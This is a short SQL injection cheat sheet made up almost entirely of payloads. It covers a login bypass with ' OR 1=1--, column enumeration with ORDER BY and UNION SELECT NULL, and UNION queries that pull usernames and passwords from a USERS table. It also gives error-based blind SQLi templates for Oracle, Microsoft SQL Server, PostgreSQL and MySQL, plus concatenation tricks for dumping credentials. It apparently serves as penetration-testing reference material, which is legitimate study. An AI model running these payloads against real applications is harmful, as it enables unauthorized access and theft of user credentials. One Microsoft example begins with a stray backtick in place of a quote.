### Basic authentication bypass
```
# Enter in the username field
' OR 1=1--
```

### Determine the number of columns in a table
```
# INcrement order by one until an "out of range" error is received

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# If the number of NULLS does not match the number of columns, an error is received.
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
### Retrieving values to fields
```
# if the number of columns and values are the same
' UNION SELECT username,password from USERS--

# if the number of columns and values are different
# Example: 3 columns 2 values
' UNION SELECT username,password,null from USERS--
# Columns must support the result type (e.g.. string column can only hold a string value)
```
### Blind SQL
```
#Oracle  
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual  

#Microsoft  
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END  

#PostgreSQL  
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END  

#MySQL  
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')  

```
### Retrieving multiple values in a single column (String Concatenation)
```
# oracle
' UNION SELECT username || '~' || password from USERS--
# Microsoft
` UNION SELECT username+password FROM USERS--

```
